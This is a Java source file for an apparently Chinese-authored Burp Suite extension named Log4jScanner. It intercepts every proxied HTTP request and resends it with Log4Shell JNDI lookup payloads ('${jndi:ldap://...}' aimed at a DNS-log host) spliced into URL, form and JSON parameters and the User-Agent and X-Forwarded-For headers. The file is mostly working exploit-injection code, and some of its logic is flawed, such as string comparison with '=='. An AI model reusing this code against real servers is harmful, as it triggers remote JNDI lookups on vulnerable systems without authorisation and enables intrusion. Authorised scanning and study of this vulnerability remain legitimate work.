package burp.UI;

import burp.*;
import burp.Http.HttpRequest;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.HashMap;
import java.util.List;
import java.util.Map;


public class Log4jScanner implements IHttpListener
{
    private JPanel panel;
    private JCheckBox checkbox;
    private TextField input;
    private Button button;
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private PrintWriter stdout;
    int count;
    private String payload;


    public Log4jScanner(IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) {
        this.callbacks = callbacks;
        this.helpers = helpers;
        callbacks.registerHttpListener(this::processHttpMessage);
        stdout = new PrintWriter(callbacks.getStdout(),true);
    }
    public JPanel getScannerUI(IBurpExtenderCallbacks callbacks){

        panel = new JPanel();
        panel.setLayout(new GridLayout(2,1));
        JPanel first = new JPanel(new FlowLayout());
        button = new Button("click");
        checkbox = new JCheckBox("start");
        input = new TextField();
        JLabel label = new JLabel();
        label.setText("请输入payload：");
        input.setText("${jndi:ldap://xxx.dnslog.cn/exp}");
        input.setPreferredSize(new Dimension(300,50));
        first.add(label);
        first.add(input);
        payload = "${" + input.getText() + "}";
        checkbox.addItemListener(new ItemListener() {
            @Override
            public void itemStateChanged(ItemEvent e) {
                if(e.getStateChange() == 1){
                    if(input.getText().length() != 0){
                        callbacks.registerHttpListener(Log4jScanner.this::processHttpMessage);
                    }else{
                        checkbox.setSelected(false);
                    }
                }else{
                    callbacks.removeHttpListener(Log4jScanner.this::processHttpMessage);
                }
            }
        });
        first.add(checkbox);
        panel.add(first);
        return panel;
    }

    @Override
    //这里并不是我点击button的时候会获取到而是我使用代理浏览器的时候走过的所有的网络请求都会记录在这里
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        if(messageIsRequest){

            byte[] request = messageInfo.getRequest();
            IRequestInfo requestInfo = helpers.analyzeRequest(messageInfo.getHttpService(), request);
            List<IParameter> parameterList = requestInfo.getParameters();//获取参数列表
            List<String> headers = requestInfo.getHeaders();
            Map headMap = headList(headers);
            String url = requestInfo.getUrl().getProtocol()+"://"+requestInfo.getUrl().getHost()+":"+requestInfo.getUrl().getPort() + requestInfo.getUrl().getPath();
            String payload = GetParameterPayload(parameterList);
            if(payload != ""){
                url += "?" + payload;
            }
            if(requestInfo.getMethod() == "GET"){
                HttpRequest.sendGet(url,headMap,callbacks);
            }else if(requestInfo.getMethod() == "POST"){
                String parms = parsList(parameterList);
                if(parms==null){
                    HttpRequest.sendGet(url,headMap,callbacks);
                }else {
                    HttpRequest.sendPost(url, parms, headMap, callbacks);
                }
            }
        }
    }
    public Map headList(List<String> list){
        Map wordList = new HashMap<>();
        for(int i = 1;i<list.size();i++){
            String[] tempArray = list.get(i).replace("\n","").split(":",2);
            //在header头中添加注入
            if(tempArray[0].equals("X-Forwarded-For") || tempArray[0].equals("User-Agent")){
                tempArray[1] = "${jndi:ldap://" + input.getText() + "}" + tempArray[1];
            }
            wordList.put(tempArray[0],tempArray[1]);
        }
        return wordList;
    }
    //现在需要获取到参数列表了，在requestInfo中获取到参数列表了,之后这里在获取到的参数内容中拼接了payload从而触发JNDI注入
    public String GetParameterPayload(List<IParameter> parameterList){
        String  result = "";
        for (IParameter iParameter : parameterList) {
            if(iParameter.getType() == IParameter.PARAM_URL){
                result += iParameter.getName() + "=" + iParameter.getValue() +"${jndi:ldap://" +(count++) + "." + input.getText() + "}" + "&";
            }
        }
        if(result != ""){
            return result.substring(0,result.length() - 1);
        }
        return result;
    }
    //获取POST参数列表
    public String parsList(List<IParameter> parameterList){
        String parmStr = "";//普通参数列表
        String jsonStr = "{";//json参数列表
        for (IParameter iParameter : parameterList) {
            if(iParameter.getType() == IParameter.PARAM_BODY){
                parmStr += iParameter.getName() + "=" + iParameter.getValue() +"${jndi:ldap://" +(count++) + "." + input.getText() + "}" + "&";
            }else if(iParameter.getType() == IParameter.PARAM_JSON){
                jsonStr += iParameter.getName() + ":" + iParameter.getValue() +"${jndi:ldap://" +(count++) + "." + input.getText() + "}" + ",";
            }
        }
        if(parmStr != ""){
            return parmStr.substring(0,parmStr.length()-1);
        }else if(jsonStr != "{"){
            return jsonStr.substring(0,jsonStr.length()-1) + "}";
        }
        return parmStr;
    }
}
